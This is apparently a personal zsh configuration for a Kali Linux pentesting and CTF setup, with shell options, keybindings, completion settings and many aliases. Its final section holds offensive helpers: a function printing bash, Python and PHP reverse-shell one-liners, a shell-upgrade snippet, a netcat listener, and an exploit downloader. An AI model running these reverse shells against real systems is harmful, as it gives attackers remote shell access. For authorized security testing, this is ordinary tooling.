# Enable Powerlevel10k instant prompt. Should stay close to the top of ~/.zshrc.
# Initialization code that may require console input (password prompts, [y/n]
# confirmations, etc.) must go above this block; everything else may go below.
if [[ -r "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh" ]]; then
  source "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh"
fi

# ============================================
# ZSH OPTIONS - Configuración avanzada
# ============================================
setopt autocd              # change directory just by typing its name
setopt interactivecomments # allow comments in interactive mode
setopt magicequalsubst     # enable filename expansion for arguments of the form 'anything=expression'
setopt nonomatch           # hide error message if there is no match for the pattern
setopt notify              # report the status of background jobs immediately
setopt numericglobsort     # sort filenames numerically when it makes sense
setopt promptsubst         # enable command substitution in prompt
setopt append_history      # append to history file
setopt auto_pushd          # make cd push old directory onto stack
setopt pushd_ignore_dups   # don't push duplicates
setopt pushd_silent        # don't print directory stack
setopt noclobber           # don't overwrite files with >
setopt rm_star_wait        # wait 10 seconds before rm *

WORDCHARS='_-' # Don't consider certain characters part of the word
PROMPT_EOL_MARK="" # hide EOL sign ('%')

# If you come from bash you might have to change your $PATH.
# export PATH=$HOME/bin:$HOME/.local/bin:/usr/local/bin:$PATH

# Path to your Oh My Zsh installation.
export ZSH="$HOME/.oh-my-zsh"

# Set name of the theme to load --- if set to "random", it will
# load a random theme each time Oh My Zsh is loaded, in which case,
# to know which specific one was loaded, run: echo $RANDOM_THEME
# See https://github.com/ohmyzsh/ohmyzsh/wiki/Themes
ZSH_THEME="powerlevel10k/powerlevel10k"

# Set list of themes to pick from when loading at random
# Setting this variable when ZSH_THEME=random will cause zsh to load
# a theme from this variable instead of looking in $ZSH/themes/
# If set to an empty array, this variable will have no effect.
# ZSH_THEME_RANDOM_CANDIDATES=( "robbyrussell" "agnoster" )

# Uncomment the following line to use case-sensitive completion.
# CASE_SENSITIVE="true"

# Uncomment the following line to use hyphen-insensitive completion.
# Case-sensitive completion must be off. _ and - will be interchangeable.
# HYPHEN_INSENSITIVE="true"

# Uncomment one of the following lines to change the auto-update behavior
# zstyle ':omz:update' mode disabled  # disable automatic updates
# zstyle ':omz:update' mode auto      # update automatically without asking
# zstyle ':omz:update' mode reminder  # just remind me to update when it's time

# Uncomment the following line to change how often to auto-update (in days).
# zstyle ':omz:update' frequency 13

# Uncomment the following line if pasting URLs and other text is messed up.
# DISABLE_MAGIC_FUNCTIONS="true"

# Uncomment the following line to disable colors in ls.
# DISABLE_LS_COLORS="true"

# Uncomment the following line to disable auto-setting terminal title.
# DISABLE_AUTO_TITLE="true"

# Uncomment the following line to enable command auto-correction.
# ENABLE_CORRECTION="true"

# Uncomment the following line to display red dots whilst waiting for completion.
# You can also set it to another string to have that shown instead of the default red dots.
# e.g. COMPLETION_WAITING_DOTS="%F{yellow}waiting...%f"
# Caution: this setting can cause issues with multiline prompts in zsh < 5.7.1 (see #5765)
# COMPLETION_WAITING_DOTS="true"

# Uncomment the following line if you want to disable marking untracked files
# under VCS as dirty. This makes repository status check for large repositories
# much, much faster.
# DISABLE_UNTRACKED_FILES_DIRTY="true"

# Uncomment the following line if you want to change the command execution time
# stamp shown in the history command output.
# You can set one of the optional three formats:
# "mm/dd/yyyy"|"dd.mm.yyyy"|"yyyy-mm-dd"
# or set a custom format using the strftime function format specifications,
# see 'man strftime' for details.
# HIST_STAMPS="mm/dd/yyyy"

# Would you like to use another custom folder than $ZSH/custom?
# ZSH_CUSTOM=/path/to/new-custom-folder

# Which plugins would you like to load?
# Standard plugins can be found in $ZSH/plugins/
# Custom plugins may be added to $ZSH_CUSTOM/plugins/
# Example format: plugins=(rails git textmate ruby lighthouse)
# Add wisely, as too many plugins slow down shell startup.
plugins=(git zsh-autosuggestions zsh-syntax-highlighting sudo)

source $ZSH/oh-my-zsh.sh

# ============================================
# KEYBINDINGS - Configuración avanzada
# ============================================
bindkey -e                                        # emacs key bindings
bindkey ' ' magic-space                           # do history expansion on space
bindkey '^U' backward-kill-line                   # ctrl + U
bindkey '^[[3;5~' kill-word                       # ctrl + Supr
bindkey '^[[3~' delete-char                       # delete
bindkey '^[[1;5C' forward-word                    # ctrl + ->
bindkey '^[[1;5D' backward-word                   # ctrl + <-
bindkey '^[[5~' beginning-of-buffer-or-history    # page up
bindkey '^[[6~' end-of-buffer-or-history          # page down
bindkey '^[[H' beginning-of-line                  # home
bindkey '^[[F' end-of-line                        # end
bindkey '^[[Z' undo                               # shift + tab undo last action
bindkey '^[[A' up-line-or-search                  # up arrow - search history
bindkey '^[[B' down-line-or-search                # down arrow - search history
bindkey '^R' history-incremental-search-backward  # ctrl+r - search history
bindkey '^S' history-incremental-search-forward   # ctrl+s - search forward
bindkey '^A' beginning-of-line                    # ctrl+a - inicio de línea
bindkey '^E' end-of-line                          # ctrl+e - fin de línea

# ============================================
# HISTORY - Configuración profesional
# ============================================
HISTFILE=~/.zsh_history
HISTSIZE=50000
SAVEHIST=50000
setopt hist_expire_dups_first # delete duplicates first when HISTFILE size exceeds HISTSIZE
setopt hist_ignore_dups       # ignore duplicated commands history list
setopt hist_ignore_space      # ignore commands that start with space
setopt hist_verify            # show command with history expansion to user before running it
setopt hist_reduce_blanks     # remove blank lines from history
setopt inc_append_history     # add commands to history immediately
setopt extended_history       # save timestamp and duration

# force zsh to show the complete history
alias history="history 0"
alias okt="sxhkd &"

# ============================================
# COMPLETION - Autocompletado avanzado
# ============================================
autoload -Uz compinit
compinit -d ~/.cache/zcompdump
zstyle ':completion:*:*:*:*:*' menu select
zstyle ':completion:*' auto-description 'specify: %d'
zstyle ':completion:*' completer _expand _complete
zstyle ':completion:*' format 'Completing %d'
zstyle ':completion:*' group-name ''
zstyle ':completion:*' list-colors ''
zstyle ':completion:*' list-prompt %SAt %p: Hit TAB for more, or the character to insert%s
zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}'
zstyle ':completion:*' rehash true
zstyle ':completion:*' select-prompt %SScrolling active: current selection at %p%s
zstyle ':completion:*' use-compctl false
zstyle ':completion:*' verbose true
zstyle ':completion:*:kill:*' command 'ps -u $USER -o pid,%cpu,tty,cputime,cmd'

# Take advantage of $LS_COLORS for completion
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    export LS_COLORS="$LS_COLORS:ow=30;44:" # fix ls color for folders with 777 permissions
    zstyle ':completion:*' list-colors "${(s.:.)LS_COLORS}"
    zstyle ':completion:*:*:kill:*:processes' list-colors '=(#b) #([0-9]#)*=0=01;31'
fi

# ============================================
# COLORS - Mejor visualización en man/less
# ============================================
export LESS_TERMCAP_mb=$'\E[1;31m'     # begin blink
export LESS_TERMCAP_md=$'\E[1;36m'     # begin bold
export LESS_TERMCAP_me=$'\E[0m'        # reset bold/blink
export LESS_TERMCAP_so=$'\E[01;33m'    # begin reverse video
export LESS_TERMCAP_se=$'\E[0m'        # reset reverse video
export LESS_TERMCAP_us=$'\E[1;32m'     # begin underline
export LESS_TERMCAP_ue=$'\E[0m'        # reset underline

# configure `time` format
TIMEFMT=$'\nreal\t%E\nuser\t%U\nsys\t%S\ncpu\t%P'

# User configuration

# export MANPATH="/usr/local/man:$MANPATH"

# You may need to manually set your language environment
# export LANG=en_US.UTF-8

# Preferred editor for local and remote sessions
# if [[ -n $SSH_CONNECTION ]]; then
#   export EDITOR='vim'
# else
#   export EDITOR='nvim'
# fi

# Compilation flags
# export ARCHFLAGS="-arch $(uname -m)"

# Set personal aliases, overriding those provided by Oh My Zsh libs,
# plugins, and themes. Aliases can be placed here, though Oh My Zsh
# users are encouraged to define aliases within a top-level file in
# the $ZSH_CUSTOM folder, with .zsh extension. Examples:
# - $ZSH_CUSTOM/aliases.zsh
# - $ZSH_CUSTOM/macos.zsh
# For a full list of active aliases, run `alias`.
#
# Example aliases
# alias zshconfig="mate ~/.zshrc"
# alias ohmyzsh="mate ~/.oh-my-zsh"

# To customize prompt, run `p10k configure` or edit ~/.p10k.zsh.
[[ ! -f ~/.p10k.zsh ]] || source ~/.p10k.zsh

# ============================================
# AUTO-SUGGESTIONS (Ctrl+Space para aceptar)
# ============================================
if [ -f /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; then
    . /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh
    ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=244'
    ZSH_AUTOSUGGEST_STRATEGY=(history completion)
    ZSH_AUTOSUGGEST_BUFFER_MAX_SIZE=20
    ZSH_AUTOSUGGEST_USE_ASYNC=1
    # Accept suggestion with Ctrl+Space
    bindkey '^ ' autosuggest-accept
fi

# ============================================
# SYNTAX HIGHLIGHTING - Colores en comandos
# ============================================
if [ -f /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]; then
    . /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
    ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets pattern)
    ZSH_HIGHLIGHT_STYLES[default]=none
    ZSH_HIGHLIGHT_STYLES[unknown-token]=underline
    ZSH_HIGHLIGHT_STYLES[reserved-word]=fg=cyan,bold
    ZSH_HIGHLIGHT_STYLES[suffix-alias]=fg=green,underline
    ZSH_HIGHLIGHT_STYLES[global-alias]=fg=green,bold
    ZSH_HIGHLIGHT_STYLES[precommand]=fg=green,underline
    ZSH_HIGHLIGHT_STYLES[commandseparator]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[autodirectory]=fg=green,underline
    ZSH_HIGHLIGHT_STYLES[path]=bold
    ZSH_HIGHLIGHT_STYLES[path_pathseparator]=
    ZSH_HIGHLIGHT_STYLES[path_prefix_pathseparator]=
    ZSH_HIGHLIGHT_STYLES[globbing]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[history-expansion]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[command-substitution]=none
    ZSH_HIGHLIGHT_STYLES[command-substitution-delimiter]=fg=magenta,bold
    ZSH_HIGHLIGHT_STYLES[process-substitution]=none
    ZSH_HIGHLIGHT_STYLES[process-substitution-delimiter]=fg=magenta,bold
    ZSH_HIGHLIGHT_STYLES[single-hyphen-option]=fg=green
    ZSH_HIGHLIGHT_STYLES[double-hyphen-option]=fg=green
    ZSH_HIGHLIGHT_STYLES[back-quoted-argument]=none
    ZSH_HIGHLIGHT_STYLES[back-quoted-argument-delimiter]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[single-quoted-argument]=fg=yellow
    ZSH_HIGHLIGHT_STYLES[double-quoted-argument]=fg=yellow
    ZSH_HIGHLIGHT_STYLES[dollar-quoted-argument]=fg=yellow
    ZSH_HIGHLIGHT_STYLES[rc-quote]=fg=magenta
    ZSH_HIGHLIGHT_STYLES[dollar-double-quoted-argument]=fg=magenta,bold
    ZSH_HIGHLIGHT_STYLES[back-double-quoted-argument]=fg=magenta,bold
    ZSH_HIGHLIGHT_STYLES[back-dollar-quoted-argument]=fg=magenta,bold
    ZSH_HIGHLIGHT_STYLES[assign]=none
    ZSH_HIGHLIGHT_STYLES[redirection]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[comment]=fg=black,bold
    ZSH_HIGHLIGHT_STYLES[named-fd]=none
    ZSH_HIGHLIGHT_STYLES[numeric-fd]=none
    ZSH_HIGHLIGHT_STYLES[arg0]=fg=cyan
    ZSH_HIGHLIGHT_STYLES[bracket-error]=fg=red,bold
    ZSH_HIGHLIGHT_STYLES[bracket-level-1]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[bracket-level-2]=fg=green,bold
    ZSH_HIGHLIGHT_STYLES[bracket-level-3]=fg=magenta,bold
    ZSH_HIGHLIGHT_STYLES[bracket-level-4]=fg=yellow,bold
    ZSH_HIGHLIGHT_STYLES[bracket-level-5]=fg=cyan,bold
    ZSH_HIGHLIGHT_STYLES[cursor-matchingbracket]=standout
fi

# ============================================
# HERRAMIENTAS PRO
# ============================================

# 1. Activar Zoxide (Comando 'z' para saltar entre carpetas)
eval "$(zoxide init zsh)"

# 2. Arreglar 'bat' (En Kali se instala como 'batcat')
alias bat='batcat'
# Usar bat para colorear las páginas de ayuda (man)
export MANPAGER="sh -c 'col -bx | bat -l man -p'"

# 3. FZF (Buscador borroso) - CONFIGURACIÓN PRO
if [ -f /usr/share/doc/fzf/examples/key-bindings.zsh ]; then
    source /usr/share/doc/fzf/examples/key-bindings.zsh
    source /usr/share/doc/fzf/examples/completion.zsh
    
    # Configuración avanzada de FZF
    export FZF_DEFAULT_OPTS="--height 40% --layout=reverse --border --inline-info \
        --preview 'batcat --color=always --style=numbers --line-range=:500 {}' \
        --color=fg:#f8f8f2,bg:#282a36,hl:#bd93f9 \
        --color=fg+:#f8f8f2,bg+:#44475a,hl+:#bd93f9 \
        --color=info:#ffb86c,prompt:#50fa7b,pointer:#ff79c6 \
        --color=marker:#ff79c6,spinner:#ffb86c,header:#6272a4"
    
    # --- FZF SUPERCHARGED (Usa fdfind/fd en lugar de find) ---
    # Esto hace que 'cd **' sea instantáneo y seguro (ignora /proc y basura)
    if command -v fdfind &> /dev/null; then
        export FZF_DEFAULT_COMMAND='fdfind --type f --hidden --follow --exclude .git'
        export FZF_CTRL_T_COMMAND="$FZF_DEFAULT_COMMAND"
        export FZF_ALT_C_COMMAND='fdfind --type d --hidden --follow --exclude .git'
    elif command -v fd &> /dev/null; then
        export FZF_DEFAULT_COMMAND='fd --type f --hidden --follow --exclude .git'
        export FZF_CTRL_T_COMMAND="$FZF_DEFAULT_COMMAND"
        export FZF_ALT_C_COMMAND='fd --type d --hidden --follow --exclude .git'
    fi
    
    # --- ARREGLO VISUAL DEL PREVIEW (TAB) ---
    # Esto le dice a FZF: "Si es carpeta usa 'ls', si es archivo usa 'bat'"
    export FZF_COMPLETION_OPTS='--preview="if [ -d {} ]; then echo -e \"\033[32m📂 Contenido:\033[0m\"; ls -la --color=always {} | head -n 50; else bat --color=always --style=numbers --line-range=:500 {}; fi"'
    export FZF_CTRL_T_OPTS=$FZF_COMPLETION_OPTS
    
    # Aplicar colores al buscador
    _fzf_compgen_path() {
      local cmd=$(command -v fdfind || command -v fd)
      if [ -n "$cmd" ]; then
        $cmd --hidden --follow --exclude ".git" . "$1"
      else
        find . "$1"
      fi
    }
    _fzf_compgen_dir() {
      local cmd=$(command -v fdfind || command -v fd)
      if [ -n "$cmd" ]; then
        $cmd --type d --hidden --follow --exclude ".git" . "$1"
      else
        find . -type d "$1"
      fi
    }
fi

# ============================================
# ALIAS DE PENTESTER (AHORRA TIEMPO)
# ============================================

# Color support for common commands
alias ls='lsd'
alias ll='lsd -l'
alias la='lsd -A'
alias l='lsd -CF'
alias grep='grep --color=auto'
alias fgrep='fgrep --color=auto'
alias egrep='egrep --color=auto'
alias diff='diff --color=auto'
alias ip='ip --color=auto'

# Actualizar todo el sistema de un golpe
alias update='sudo apt update && sudo apt full-upgrade -y && sudo apt autoremove -y'

# Mi IP (Muestra solo la IP de la VPN o la local, sin basura)
alias myip='ip -br -c a'
alias myip4='ip -4 addr show | grep inet | grep -v 127.0.0.1 | cut -d" " -f6 | cut -d"/" -f1'
alias myip6='ip -6 addr show | grep inet6 | grep -v ::1 | cut -d" " -f6 | cut -d"/" -f1'

# Servidor web rápido (Para pasar archivos a la víctima)
alias www='python3 -m http.server 80'
alias www8='python3 -m http.server 8000'
alias phpserver='php -S 0.0.0.0:8000'

# Grep con colores
alias grep='grep --color=auto'
alias sgrep='grep -R -n -H -C 5 --exclude-dir={.git,.svn,CVS}' # Smart grep

# Navegación rápida
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'
alias .....='cd ../../../..'

# Comandos de red útiles
alias ports='netstat -tulanp'
alias listening='lsof -i -P | grep LISTEN'
alias portscan='nmap -sS -sV -O'

# Git shortcuts
alias gs='git status'
alias ga='git add'
alias gc='git commit -m'
alias gp='git push'
alias gl='git log --oneline --graph --decorate'

# Procesos
alias psg='ps aux | grep -v grep | grep -i -e VSZ -e'
alias psgrep='ps aux | grep'

# Disk usage
alias du='du -h'
alias df='df -h'

# Copiar con progreso
alias cpv='rsync -ah --info=progress2'

# Extraer cualquier archivo comprimido
alias extract='atool -x'







# --- FUNCIONES PRO PARA PENTESTING ---

# Extraer archivos automáticamente según extensión
unalias extract 2>/dev/null
function extract() {
    if [ -f "$1" ] ; then
        case "$1" in
            *.tar.bz2)   tar xjf "$1"     ;;
            *.tar.gz)    tar xzf "$1"     ;;
            *.bz2)       bunzip2 "$1"     ;;
            *.rar)       unrar x "$1"     ;;
            *.gz)        gunzip "$1"      ;;
            *.tar)       tar xf "$1"      ;;
            *.tbz2)      tar xjf "$1"     ;;
            *.tgz)       tar xzf "$1"     ;;
            *.zip)       unzip "$1"       ;;
            *.Z)         uncompress "$1"  ;;
            *.7z)        7z x "$1"        ;;
            *)           echo "'$1' no se puede extraer con extract()" ;;
        esac
    else
        echo "'$1' no es un archivo válido"
    fi
}
# Crear directorio y entrar en él
mkcd() {
    mkdir -p "$1" && cd "$1"
}

# Buscar proceso y matar
kp() {
    ps aux | grep $1 | grep -v grep | awk '{print $2}' | xargs sudo kill -9
}

# Buscar en historial de forma inteligente
hs() {
    history | grep "$@"
}

# Copiar con progreso usando rsync
cp_p() {
    rsync -ah --progress "$1" "$2"
}

# Generar contraseña aleatoria
genpass() {
    local length=${1:-16}
    LC_ALL=C tr -dc 'A-Za-z0-9!@#$%^&*' < /dev/urandom | head -c $length
    echo
}

# Ver puertos abiertos de forma rápida
listports() {
    sudo netstat -tulanp | grep LISTEN
}

# Buscar archivos por nombre
ff() {
    find . -type f -iname "*$1*"
}

alias fsuid='find / -perm -4000 2>/dev/null'
alias fnew='find . -type f -mmin -10'
alias fdir='find . -type d -iname'

# Buscar directorios por nombre
fd() {
    find . -type d -iname "*$1*"
}

# Backup rápido de archivo
bk() {
    cp "$1" "$1.bak.$(date +%Y%m%d_%H%M%S)"
}

# Mostrar PATH de forma legible
path() {
    echo $PATH | tr ':' '\n'
}

# Subir archivo a transfer.sh
transfer() {
    if [ $# -eq 0 ]; then
        echo "Uso: transfer <archivo>"
        return 1
    fi
    curl --upload-file "$1" "https://transfer.sh/$(basename $1)"
    echo
}

# enable command-not-found if installed
if [ -f /etc/zsh_command_not_found ]; then
    . /etc/zsh_command_not_found
fi

# ============================================
# SCRIPTS Y PATHS PERSONALIZADOS
# ============================================

# CTF Utils scripts (si existe)
if [ -f ~/.config/zsh/scripts/ctf_utils.zsh ]; then
    source ~/.config/zsh/scripts/ctf_utils.zsh
fi

# opencode
if [ -d /home/kali/.opencode/bin ]; then
    export PATH=/home/kali/.opencode/bin:$PATH
fi

# ============================================
# ALIAS Y FUNCIONES PARA CTF/PENTESTING
# ============================================
# Nmap presets
alias nmap-quick='nmap -sC -sV -oN quick.txt'
alias nmap-full='nmap -p- -sC -sV -oN full.txt'
alias nmap-udp='sudo nmap -sU -sC -sV -oN udp.txt'
alias nmap-vuln='nmap --script vuln -oN vuln.txt'

# Escaneo rápido de CTF
ctfscan() {
    local target=$1
    echo "[+] Quick scan on $target..."
    nmap -sC -sV -oA nmap/$target $target
}



# Upgrade de TTY en shell reversa
ttyup() {
    cat << 'EOF'
# En la reverse shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z (suspender)
stty raw -echo; fg
# Luego en la shell:
export TERM=xterm
export SHELL=/bin/bash
stty rows 38 columns 116  # Ajusta según tu terminal
EOF
}




# Generar reverse shell rápida
revshell() {
    local ip=${1:-$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || echo "10.10.10.10")}
    local port=${2:-443}
    echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
    echo "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
}

# Listener rápido con rlwrap
alias nc='rlwrap nc'
listen() {
    local port=${1:-443}
    echo "[+] Listening on port $port..."
    rlwrap nc -lvnp $port
}




# Ver tu IP de tun0 (VPN)
alias vpnip='ip -4 addr show tun0 | grep -oP "(?<=inet\s)\d+(\.\d+){3}"'

# Copiar a clipboard (requiere xclip o wl-clipboard)
alias clip='xclip -selection clipboard'
alias paste='xclip -selection clipboard -o'

# Ejemplo: echo "texto" | clip




# Descargar exploit de GitHub rápido
getexploit() {
    local url=$1
    local name=$(basename $url)
    wget $url -O $name && chmod +x $name
    echo "[+] Exploit descargado: $name"
}

